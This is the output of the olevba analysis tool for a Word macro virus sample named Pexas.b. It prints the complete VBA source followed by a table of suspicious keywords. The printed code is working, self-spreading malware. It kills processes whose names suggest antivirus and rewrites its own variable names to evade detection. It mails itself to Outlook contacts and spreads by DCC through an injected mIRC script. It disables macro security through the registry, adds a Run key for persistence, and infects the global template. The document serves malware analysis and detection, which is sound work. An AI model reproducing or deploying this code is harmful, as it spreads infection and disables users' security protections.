olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pexas.b-2e2369e06660ed5793ab7a65434d3bf1f8dbee1a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pexas.b-2e2369e06660ed5793ab7a65434d3bf1f8dbee1a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function ShowCursor Lib "user32" (ByVal bShow As Long) As Long
Sub Document_Open() '‚p|
On Error Resume Next 'um<
VWWMp = Day(Date) '97–
If VWWMp = 23 Then '(L#
MsgBox Chr(34) + Chr(100) + Chr(105) + Chr(101) + Chr(32) + Chr(100) + Chr(105) + Chr(101) + Chr(32) + _
Chr(100) + Chr(105) + Chr(101) + Chr(34) + Chr(32) + Chr(45) + Chr(91) + Chr(100) + Chr(105) + Chr(101) + _
Chr(51) + Chr(93) + Chr(45) + Chr(32) + Chr(98) + Chr(121) + Chr(32) + Chr(77) + Chr(73) + Chr(95) + Chr(112) + _
Chr(105) + Chr(114) + Chr(97) + Chr(116), vbInformation, Chr(100) + Chr(105) + Chr(101) + Chr(51) + Chr(32) + _
Chr(86) + Chr(105) + Chr(114) + Chr(117) + Chr(115) '�†[
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Desktop", "Wallpaper") = "C:\Windows\setup.bmp"
ShowCursor 0 '^"W
End If '<y6
Set CGAMp = Tasks 'se‡
For LNRMp = 1 To CGAMp.Count 'k5Ž
If InStr(1, CGAMp(LNRMp).Name, "av", vbTextCompare) Or InStr(1, CGAMp(LNRMp).Name, "AV", vbTextCompare) Then
CGAMp(LNRMp).Close 'vmh
End If '\o!
Next LNRMp '4$i
Set CGAMp = ActiveDocument.VBProject '~Bi
Set KNYMp = CGAMp.VBComponents(1).CodeModule 'MC`
If ThisDocument.FullName <> Templates(1).FullName Then 'CQ
VWWMp = 17 '‡(•
ReDim PHEMp(1 To VWWMp) As String '("V
PHEMp(1) = "VWWMp": PHEMp(2) = "RDVMp": PHEMp(3) = "PHEMp": PHEMp(4) = "LXDMp" 'V"F
PHEMp(5) = "MWYMp": PHEMp(6) = "LNRMp": PHEMp(7) = "CGAMp": PHEMp(8) = "KYDMp" 'NV‡
PHEMp(9) = "PWOMp": PHEMp(10) = "KKKMp": PHEMp(11) = "XWDMp" ']‰!
PHEMp(12) = "MHFMp": PHEMp(13) = "DPLMp": PHEMp(14) = "NMPMp": PHEMp(15) = "OTVMp": PHEMp(16) = "PGCMp": PHEMp(17) = "KNYMp"
For LNRMp = 1 To VWWMp 'D%Ś
Randomize 'Cq]
MWYMp = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + "Mp" '!pr
For RDVMp = 2 To KNYMp.CountOfLines 'G@$
KYDMp = KNYMp.Lines(RDVMp, 1) 'VtJ
If InStr(1, KYDMp, PHEMp(LNRMp), vbTextCompare) Then 'O|…
KYDMp = Replace(KYDMp, PHEMp(LNRMp), MWYMp, 1, -1, vbTextCompare) '•sg
KNYMp.ReplaceLine RDVMp, KYDMp 'N[Ť
End If '‡0…
Next RDVMp 'HV—
Next LNRMp 'j9Z
For LNRMp = 2 To KNYMp.CountOfLines '4]]
KYDMp = KNYMp.Lines(LNRMp, 1) '„j’
If Len(KYDMp) <= 100 Then ''‡}
KYDMp = KYDMp + "'" + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32))
KNYMp.ReplaceLine LNRMp, KYDMp '”�[
End If 'ZHY
Next LNRMp 'Q8—
End If 'GlW
MHFMp = Chr(79) + Chr(117) + Chr(116) + Chr(108) + Chr(111) + Chr(111) + Chr(107) 'o??
Set PWOMp = CreateObject(MHFMp + Chr(46) + Chr(65) + Chr(112) + Chr(112) + Chr(108) + Chr(105) + Chr(99) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110))
DPLMp = Chr(77) + Chr(65) + Chr(80) + Chr(73) 'cw4
Set KKKMp = PWOMp.GetNameSpace(DPLMp) 'UaR
Set MHFMp = KKKMp.AddressLists 'XwL
For LNRMp = 1 To MHFMp.Count '0”^
Set ABook = KKKMp.AddressLists(LNRMp) 'N2Ž
DPLMp = 1 '‡$Z
Set NMPMp = ABook.AddressEntries 'LT}
Set XWDMp = PWOMp.CreateItem(0) '"t‰
For PGCMp = 1 To NMPMp.Count 'IŤ_
OTVMp = NMPMp(DPLMp) ';2:
XWDMp.Recipients.Add OTVMp 'qx
DPLMp = DPLMp + 1 '„i‡
If DPLMp > 20 Then VWWMp = NMPMp.Count ''c’
Next PGCMp 'b'`
MWYMp = ActiveDocument.FullName 'F|w
XWDMp.Subject = "hello!!!" '‹R7
XWDMp.Body = "Cool jokes (more in the doc.) " '\jK
XWDMp.Attachments.Add MWYMp 'G\r
XWDMp.Send '<tr
OTVMp = "" '[‘O
Next LNRMp 'KWD
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "XP") <> "inXP" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "XP") = "inXP" '‚†�
Options.SaveNormalPrompt = 5 Xor 5 'FxV
CommandBars(Chr(84) + Chr(111) + Chr(111) + Chr(108) + Chr(115)).Controls(Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111)).Enabled = (1 Xor 1)
Open "C:\a.reg" For Output As #1 'G�\
Print #1, "REGEDIT4" 'm];
Print #1, "" 'haV
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security]" 'uQg
Print #1, """Level"" = dword:00000001" '/U7
Print #1, """AccessVBOM"" = dword:00000001" 'aj9
Print #1, "[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]" 'Pja
Print #1, """doc"" = " + """" + ActiveDocument.FullName + """" '>3!
Close #1 'oC%
Shell "C:\Windows\regedit /s C:\a.reg" '`�‘
Kill "C:\a.reg" ',k—
Randomize '8+`
MWYMp = ActiveDocument.FullName '�I'
KYDMp = "C:\" + Chr(Int((25 * Rnd) + 65)) + ".zip" 'y.’
scr = "C:\" + Chr(Int((25 * Rnd) + 65)) + ".doc" '$v�
ActiveDocument.SaveAs scr 'A(�
ActiveDocument.SaveAs MWYMp ',�_
MWYMp = Application.System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows" & _
"\CurrentVersion\App Paths\winzip32.exe", "") 'c�+
Shell MWYMp & " -a -r " & KYDMp & Chr(32) & scr, vbHide 'd—,
MWYMp = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\mIRC\", "UninstallString")
MWYMp = Mid(MWYMp, 2, Len(MWYMp) - 23) '‚‘U
Open MWYMp + "script.ini" For Output As #1 '=1–
Print #1, "[Script]" '[†B
Print #1, "n0=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }" '‰/@
Print #1, "n1=/dcc send $nick " & Chr(34) & KYDMp & Chr(34) 'G5<
Print #1, "n2=}" '3Cg
Close #1 '@U]
VWWMp = KNYMp.CountOfLines '•=Q
Set CGAMp = Templates(1).VBProject.VBComponents '4fŤ
Set KNYMp = CGAMp.Item(1).CodeModule '//m
KNYMp.DeleteLines 1, KNYMp.CountOfLines '9("
KNYMp.InsertLines 1, "Sub Document_Close" '&—!
For LNRMp = 2 To VWWMp 'fR’
Set CGAMp = ActiveDocument.VBProject '5:K
Set KNYMp = CGAMp.VBComponents(1).CodeModule '„j�
KYDMp = KNYMp.Lines(LNRMp, 1) '•Ž�
Set CGAMp = Templates(1).VBProject.VBComponents '‹ko
Set KNYMp = CGAMp.Item(1).CodeModule '€�’
KNYMp.InsertLines LNRMp, KYDMp 'v�V
Next LNRMp '0);
Set CGAMp = Templates(1) '!Sf
CGAMp.Save '„'Š
End If 'fŚŤ
Set CGAMp = ActiveDocument.VBProject 'UŤ>
Set KNYMp = CGAMp.VBComponents(1).CodeModule '2+(
VWWMp = KNYMp.CountOfLines 'p][
If Not ((VWWMp < 145) And (VWWMp > 142)) Then 't^Ť
KNYMp.DeleteLines 1, VWWMp 'oDp
Set CGAMp = Templates(1).VBProject.VBComponents '�"0
Set KNYMp = CGAMp.Item(1).CodeModule 'k‚r
KYDMp = KNYMp.Lines(1, 1) 'XŤP
Set CGAMp = ActiveDocument.VBProject '�!s
Set KNYMp = CGAMp.VBComponents(1).CodeModule '+—k
KNYMp.InsertLines 1, KYDMp 't})
KNYMp.InsertLines 2, "Sub Document_Open" '@K<
Set CGAMp = Templates(1).VBProject.VBComponents 'h:6
Set KNYMp = CGAMp.Item(1).CodeModule '"z\
VWWMp = KNYMp.CountOfLines 'O\:
For LNRMp = 3 To VWWMp 'g„:
KYDMp = KNYMp.Lines(LNRMp, 1) ';R-
Set CGAMp = ActiveDocument.VBProject 'R}[
Set KNYMp = CGAMp.VBComponents(1).CodeModule '’’8
KNYMp.InsertLines LNRMp, KYDMp 'PŤB
Next LNRMp 'Ś^5
ActiveDocument.Save '†J‘
End If '}mQ
End Sub 't’#
'9}
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |a.reg               |Executable file name                         |
|IOC       |winzip32.exe        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

